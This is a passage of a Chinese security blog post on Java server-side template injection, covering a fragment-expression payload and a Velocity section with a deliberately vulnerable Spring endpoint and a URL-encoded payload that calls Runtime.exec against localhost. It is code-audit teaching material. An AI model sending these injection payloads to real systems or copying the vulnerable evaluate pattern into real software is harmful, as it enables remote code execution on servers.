+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">fragment</span><span class="o">=</span><span class="n">__$</span><span class="o">%</span><span class="n">7bnew</span><span class="o">%</span><span class="n">20java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">Scanner</span><span class="p">(</span><span class="n">T</span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Runtime</span><span class="p">).</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="o">%</span><span class="n">22calc</span><span class="o">%</span><span class="n">22</span><span class="p">).</span><span class="na">getInputStream</span><span class="p">()).</span><span class="na">next</span><span class="p">()</span><span class="o">%</span><span class="n">7d__</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>除了getNames接口之外，getKeys和getValues接口同样也存在漏洞</strong></p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/16.png"
+	width="2003"
+	height="984"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/16_hu_8999479035c0acb3.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/16_hu_f10f166692294e60.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="203"
+		data-flex-basis="488px"
+	
+></p>
+<h2 id="3velocity模板注入">3.Velocity模板注入
+</h2><p><a class="link" href="https://zhuanlan.zhihu.com/p/680660633"  target="_blank" rel="noopener"
+    >https://zhuanlan.zhihu.com/p/680660633</a></p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/7VxKATKpJ-wMZkFaStbUxw"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/7VxKATKpJ-wMZkFaStbUxw</a></p>
+<p><a class="link" href="https://juejin.cn/post/7034112895277498404"  target="_blank" rel="noopener"
+    >https://juejin.cn/post/7034112895277498404</a></p>
+<h3 id="31velocity介绍">3.1.Velocity介绍
+</h3><p><strong>Velocity 模板是一种用于快速开发 Web 应用程序的模板引擎。它允许开发人员使用自然语言和简单的语法来描述 Web 应用程序的 UI 和业务逻辑，从而提高开发效率和代码质量。</strong></p>
+<p><strong><font style="color:#DF2A3F;">Velocity 小于等于 2.2 版本存在模板注入漏洞。</font></strong></p>
+<h3 id=""><strong><font style="color:#DF2A3F;">3.2.漏洞Demo</font></strong>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">        </span><span class="o">&lt;</span><span class="n">dependency</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="o">&lt;</span><span class="n">groupId</span><span class="o">&gt;</span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">velocity</span><span class="o">&lt;/</span><span class="n">groupId</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="o">&lt;</span><span class="n">artifactId</span><span class="o">&gt;</span><span class="n">velocity</span><span class="o">&lt;/</span><span class="n">artifactId</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="o">&lt;</span><span class="n">version</span><span class="o">&gt;</span><span class="n">1</span><span class="p">.</span><span class="na">7</span><span class="o">&lt;/</span><span class="n">version</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="o">&lt;/</span><span class="n">dependency</span><span class="o">&gt;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@GetMapping</span><span class="p">(</span><span class="s">&#34;/ssti&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">velocity</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">template</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Velocity</span><span class="p">.</span><span class="na">init</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">VelocityContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">VelocityContext</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">context</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;name&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;lisi&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">StringWriter</span><span class="w"> </span><span class="n">swOut</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">StringWriter</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Velocity</span><span class="p">.</span><span class="na">evaluate</span><span class="p">(</span><span class="n">context</span><span class="p">,</span><span class="w"> </span><span class="n">swOut</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;test&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">template</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="link" href="http://127.0.0.1:8081/ssti?template=%23set%28$e=%22e%22%29;$e.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getMethod%28%22getRuntime%22,null%29.invoke%28null,null%29.exec%28%22calc%22%29"  target="_blank" rel="noopener"
+    >http://127.0.0.1:8081/ssti?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)</a></p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/17.png"
+	width="1833"
+	height="1084"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/17_hu_fddccfc9386a0a14.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/17_hu_1db212b62234128a.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="169"
+		data-flex-basis="405px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">%</span><span class="n">23set</span><span class="p">(</span><span class="n">$e</span><span class="o">=%</span><span class="n">22e</span><span class="o">%</span><span class="n">22</span><span class="p">);</span><span class="n">$e</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">forName</span><span class="p">(</span><span class="o">%</span><span class="n">22java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Runtime</span><span class="o">%</span><span class="n">22</span><span class="p">).</span><span class="na">getMethod</span><span class="p">(</span><span class="o">%</span><span class="n">22getRuntime</span><span class="o">%</span><span class="n">22</span><span class="p">,</span><span class="kc">null</span><span class="p">).</span><span class="na">invoke</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span><span class="kc">null</span><span class="p">).</span><span class="na">exec</span><span class="p">(</span><span class="o">%</span><span class="n">22calc</span><span class="o">%</span><span class="n">22</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>By Lsec</span>
+    </section>
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 Aug 15, 2025 17:14 &#43;0800
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+        
+        
+            <div class="article-image">
+                <img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/logo.a032b2980eb9a6fcad2e1a5a6a085e82_hu_b8a65311795c358b.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Fastjson反序列化"
+                        
+                        data-hash="md5-oDKymA65pvytLhpaaghegg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Fastjson反序列化</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/log4j%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+        
+        
+            <div class="article-image">
+                <img src="/p/log4j%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/log4j.9c2086567b12e85d6f168b96609be169_hu_95a73b7e88de438a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Log4j反序列化"
+                        
+                        data-hash="md5-nCCGVnsS6F1vFouWYJvhaQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Log4j反序列化</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+        
+        
+            <div class="article-image">
+                <img src="/p/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Shiro.cb9a652dbd8b741f354c244687ea7687_hu_829ecce2c1a08e9c.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Shiro反序列化"
+                        
+                        data-hash="md5-y5plLb2LdB81TCRGh&#43;p2hw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Shiro反序列化</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/java%E5%8F%8D%E5%B0%84/">
+        
+        
+            <div class="article-image">
+                <img src="/p/java%E5%8F%8D%E5%B0%84/logo.7fcbe6004ffe9c454ad90a0e044fe3a1_hu_4a95dbe442afaa0a.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Java反射"
+                        
+                        data-hash="md5-f8vmAE/&#43;nEVK2QoOBE/joQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Java反射</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/">
+        
+        
+            <div class="article-image">
+                <img src="/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/2.0545eed92af73300cac3dc878e1aa0fe_hu_f51d45d9e0a593e8.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Windows日志分析"
+                        
+                        data-hash="md5-BUXu2Sr3MwDKw9yHjhqg/g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Windows日志分析</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 Lsec&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>���¹鵵ҳ</title>
+    
+    <script defer src="https://cn.vercount.one/js"></script>
+</head>
+<body>
+</body>
+</html>
+    </body>
+</html>
